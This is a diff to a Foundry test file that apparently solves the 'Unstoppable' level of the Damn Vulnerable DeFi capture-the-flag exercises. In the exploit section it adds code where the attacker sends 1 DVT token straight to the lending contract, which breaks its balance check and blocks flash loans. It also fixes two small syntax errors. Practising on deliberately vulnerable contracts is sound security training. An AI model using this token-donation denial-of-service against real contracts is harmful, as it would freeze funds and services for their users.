@@ -3,7 +3,7 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
-import "forge-std/console.sol"
+import "forge-std/console.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
 import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";
@@ -30,8 +30,6 @@ contract Unstoppable is Test {
         someUser = users[1];
         vm.label(someUser, "User");
         vm.label(attacker, "Attacker");
-
-        console.log(Attacker,attacker)
 
         dvt = new DamnValuableToken();
         vm.label(address(dvt), "DVT");
@@ -62,10 +60,13 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
-        /**
-         * EXPLOIT END *
+        vm.startPrank(attacker);
+        address payable contractAddress = payable(address(unstoppableLender));
+        dvt.transfer(contractAddress, 1 ether);
+        /* EXPLOIT END *
          */
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
+        vm.stopPrank();
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
